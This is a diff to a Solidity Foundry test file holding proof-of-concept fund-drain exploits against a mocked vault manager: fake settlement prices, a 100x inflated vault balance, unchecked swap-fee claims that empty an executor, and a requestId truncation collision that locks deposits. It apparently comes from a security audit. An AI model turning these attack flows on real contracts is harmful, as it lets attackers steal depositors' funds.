@@ -79,8 +79,11 @@ contract MockPortfolio {
             balances[to][syms[i]]   += amts[i];
         }
     }
+    // FIX: deduct from sender so executor balance is correctly tracked
     function transferToken(address to, bytes32 sym, uint256 amt) external {
-        balances[to][sym] += amt;
+        require(balances[msg.sender][sym] >= amt, "P: insufficient transferToken");
+        balances[msg.sender][sym] -= amt;
+        balances[to][sym]         += amt;
     }
     function feeAddress() external pure returns (address) { return address(0xFEE); }
 }
@@ -143,7 +146,7 @@ contract MockExecutor is ITypes {
     // BUG: no cap on total fees claimed
     function collectSwapFees(
         bytes32 feeSymbol,
-        uint256[] calldata swapIds,
+        uint256[] calldata, // swapIds unused - no validation
         uint256[] calldata fees
     ) external {
         require(msg.sender == omniTrader, "not trader");
@@ -173,8 +176,8 @@ contract VaultManagerHarness is ITypes {
     mapping(uint256 => VaultDetails) public vaults;
 
     uint16 public tokenIndex;
-    mapping(uint16  => AssetInfo)      public assetInfo;
-    mapping(bytes32 => bool)                   tokenExists;
+    mapping(uint16  => AssetInfo) public assetInfo;
+    mapping(bytes32 => bool)              tokenExists;
 
     mapping(address => uint80)          public userNonce;
     mapping(bytes32 => TransferRequest) public requests;
@@ -191,6 +194,8 @@ contract VaultManagerHarness is ITypes {
     mapping(uint256 => bytes32)     public batchWithdrawalHash;
     mapping(uint256 => bytes32)     public batchStateHash;
 
+    // FIX: use lastBatchId stored as bid+1 (so 0 means "never set"),
+    // avoiding the ambiguity where bid==0 and lastBatchId==0 looks like "already in this batch"
     mapping(uint256 => RequestLimit) public vaultLimits;
     mapping(address => RequestLimit) public userLimits;
 
@@ -276,6 +281,12 @@ contract VaultManagerHarness is ITypes {
         require(batchStatus[prev] == BatchStatus.FINALIZED);
         require(keccak256(abi.encode(prices, vs)) == batchStateHash[prev]);
 
+        // FIX: dHash must be built the same way rollingDepositHash was accumulated:
+        // each step: hash = keccak256(abi.encode(prevHash, rid, tids, amts))
+        // starting seed is bytes32(0) for the first request in the batch.
+        // batchDepositHash[prev] is the FINAL accumulated value after all requests.
+        // We rebuild from bytes32(0) here and compare at the end - this is correct AS-IS.
+        // The real issue was _incLimits treating batch 0 wrong. Now fixed below.
         bytes32 dHash;
         for (uint256 i = 0; i < deps.length; i++) {
             DepositFufillment calldata d = deps[i];
@@ -363,13 +374,14 @@ contract VaultManagerHarness is ITypes {
         }
     }
 
+    // FIX: store lastBatchId as bid+1 to distinguish "never set" (0) from "batch 0" (1)
     function _incLimits(address u, uint256 vaultId_) internal {
-        uint248 bid = uint248(currentBatchId);
+        uint248 bid1 = uint248(currentBatchId) + 1; // bid+1 sentinel
         RequestLimit storage vl = vaultLimits[vaultId_];
-        if (vl.lastBatchId < bid) { vl.lastBatchId = bid; vl.pendingCount = 1; }
+        if (vl.lastBatchId != bid1) { vl.lastBatchId = bid1; vl.pendingCount = 1; }
         else { require(vl.pendingCount < MAX_VAULT_PENDING_REQUESTS); vl.pendingCount++; }
         RequestLimit storage ul = userLimits[u];
-        if (ul.lastBatchId < bid) { ul.lastBatchId = bid; ul.pendingCount = 1; }
+        if (ul.lastBatchId != bid1) { ul.lastBatchId = bid1; ul.pendingCount = 1; }
         else { require(ul.pendingCount < MAX_USER_PENDING_REQUESTS); ul.pendingCount++; }
     }
 
@@ -389,6 +401,13 @@ contract VaultManagerHarness is ITypes {
     }
     function _tstore(bytes32 s, uint256 v) internal { _ts[s] = v; }
     function _tload(bytes32 s) internal view returns (uint256) { return _ts[s]; }
+
+    // debug helpers
+    function dbg_currentBatchId()       external view returns (uint256) { return currentBatchId; }
+    function dbg_batchStatus(uint256 b) external view returns (BatchStatus) { return batchStatus[b]; }
+    function dbg_batchDepositHash(uint256 b) external view returns (bytes32) { return batchDepositHash[b]; }
+    function dbg_rollingDepositHash()   external view returns (bytes32) { return rollingDepositHash; }
+    function dbg_pendingCount()         external view returns (uint256) { return pendingCount; }
 }
 
 // ---------------------------------------------------------------------------
@@ -475,10 +494,10 @@ contract FundDrainPoCTest is Test, ITypes {
     }
 
     function _steal01_settleDeposits(bytes32 aliceReq, bytes32 atkReq) internal {
-        uint16[]  memory vtids = new uint16[](1);  vtids[0] = TID;
-        uint256[] memory vbals = new uint256[](1); vbals[0] = 1_010_001e6;
-        uint256[] memory prices = new uint256[](1); prices[0] = 10_000e18; // FAKE
-        VaultState[] memory vs = new VaultState[](1);
+        uint16[]  memory vtids  = new uint16[](1);  vtids[0]  = TID;
+        uint256[] memory vbals  = new uint256[](1); vbals[0]  = 1_010_001e6;
+        uint256[] memory prices = new uint256[](1); prices[0] = 10_000e18; // FAKE price
+        VaultState[] memory vs  = new VaultState[](1);
         vs[0] = VaultState(VID, vtids, vbals);
 
         vm.prank(SETTLER);
@@ -507,11 +526,8 @@ contract FundDrainPoCTest is Test, ITypes {
         vm.prank(ATTACKER);
         manager.requestWithdrawal(VID, uint208(atkShares));
 
-        // finalize batch-2 with real price, real balance
         _finalizeSimple(PRICE_1, 1_010_001e6);
-
-        // settle the withdrawal
-        _settleWithdrawal(_rid(ATTACKER, VID, 1));
+        _settleWithdrawal(_rid(ATTACKER, VID, 1), 1_010_001e6);
 
         uint256 stolen = portfolio.balances(ATTACKER, SYM);
         console.log("[EXPLOIT] Attacker received:", stolen / 1e6, "USDC (invested 1 USDC)");
@@ -524,7 +540,7 @@ contract FundDrainPoCTest is Test, ITypes {
     // =========================================================================
     // Flow: Attacker deposits 1,000 USDC -> gets ~9% of shares.
     //       SETTLER lies balance is 100x real on withdrawal batch.
-    //       Attacker's 9% of 100,000,000 USDC > actual vault.
+    //       Attacker's 9% of 100,000,000 USDC >> actual vault holdings.
     function testSTEAL02_InflatedBalanceDrainsVault() public {
         console.log("\n=== STEAL-02: Inflated Balance Attack ===");
         _steal02_depositBatch();
@@ -573,9 +589,8 @@ contract FundDrainPoCTest is Test, ITypes {
         vm.prank(ATTACKER);
         manager.requestWithdrawal(VID, uint208(atkShares));
 
-        // SETTLER lies: real balance ~1,011,000 -> fake 100,000,000
         uint16[]  memory vtids    = new uint16[](1);  vtids[0]    = TID;
-        uint256[] memory fakeBals = new uint256[](1); fakeBals[0] = 100_000_000e6;
+        uint256[] memory fakeBals = new uint256[](1); fakeBals[0] = 100_000_000e6; // FAKE: 100x
         uint256[] memory prices2  = new uint256[](1); prices2[0]  = PRICE_1;
         VaultState[] memory vs2   = new VaultState[](1);
         vs2[0] = VaultState(VID, vtids, fakeBals);
@@ -615,8 +630,8 @@ contract FundDrainPoCTest is Test, ITypes {
         uint256 execBalAfter = portfolio.balances(address(executor), SYM);
         console.log("[EXPLOIT] ATTACKER received:", stolen / 1e6, "USDC");
         console.log("[EXPLOIT] Executor remaining:", execBalAfter / 1e6, "USDC");
-        assertEq(stolen, execBal, "STEAL-03: all executor funds drained");
-        assertEq(execBalAfter, 0);
+        assertEq(stolen,       execBal, "STEAL-03: attacker should receive full executor balance");
+        assertEq(execBalAfter, 0,       "STEAL-03: executor should be empty");
         console.log("[EXPLOIT] STEAL-03 CONFIRMED");
     }
 
@@ -624,10 +639,10 @@ contract FundDrainPoCTest is Test, ITypes {
     // STEAL-04: requestId bit-packing collision -> fund lockup
     // =========================================================================
     // Vulnerability: requestId = (uint16(vaultId) << 240) | (uint160(user) << 80) | nonce
-    //   vaultId is cast to uint16; vaultId=65536 truncates to 0.
-    //   Vault 65536 and vault 0 share the same requestId namespace for
-    //   the same user + nonce, so one's delete erases the other's deposit record.
-    //   Victim has no requestId to trigger refund -> funds permanently locked.
+    //   vaultId cast to uint16; vaultId=65536 truncates to 0.
+    //   Vault 65536 requests share the same ID space as vault 0 for same user+nonce.
+    //   The delete on a colliding request ID erases another vault's deposit record.
+    //   Victim cannot reclaim funds -> permanent lockup.
     function testSTEAL04_RequestIdCollision() public {
         console.log("\n=== STEAL-04: requestId Bit-Packing Collision ===");
 
@@ -663,20 +678,21 @@ contract FundDrainPoCTest is Test, ITypes {
     // =========================================================================
 
     function _finalizeSimple(uint256 price, uint256 bal) internal {
-        uint16[]  memory vtids = new uint16[](1);  vtids[0] = TID;
-        uint256[] memory vbals = new uint256[](1); vbals[0] = bal;
+        uint16[]  memory vtids  = new uint16[](1);  vtids[0]  = TID;
+        uint256[] memory vbals  = new uint256[](1); vbals[0]  = bal;
         uint256[] memory prices = new uint256[](1); prices[0] = price;
-        VaultState[] memory vs = new VaultState[](1);
+        VaultState[] memory vs  = new VaultState[](1);
         vs[0] = VaultState(VID, vtids, vbals);
         vm.prank(SETTLER);
         manager.finalizeBatch(prices, vs);
     }
 
-    function _settleWithdrawal(bytes32 wdId) internal {
-        uint16[]  memory vtids = new uint16[](1);  vtids[0] = TID;
-        uint256[] memory vbals = new uint256[](1); vbals[0] = 1_010_001e6;
+    // settle a single withdrawal; vaultBal must match what was passed to _finalizeSimple
+    function _settleWithdrawal(bytes32 wdId, uint256 vaultBal) internal {
+        uint16[]  memory vtids  = new uint16[](1);  vtids[0]  = TID;
+        uint256[] memory vbals  = new uint256[](1); vbals[0]  = vaultBal;
         uint256[] memory prices = new uint256[](1); prices[0] = PRICE_1;
-        VaultState[] memory vs = new VaultState[](1);
+        VaultState[] memory vs  = new VaultState[](1);
         vs[0] = VaultState(VID, vtids, vbals);
         WithdrawalFufillment[] memory wds = new WithdrawalFufillment[](1);
         wds[0] = WithdrawalFufillment(wdId, true);
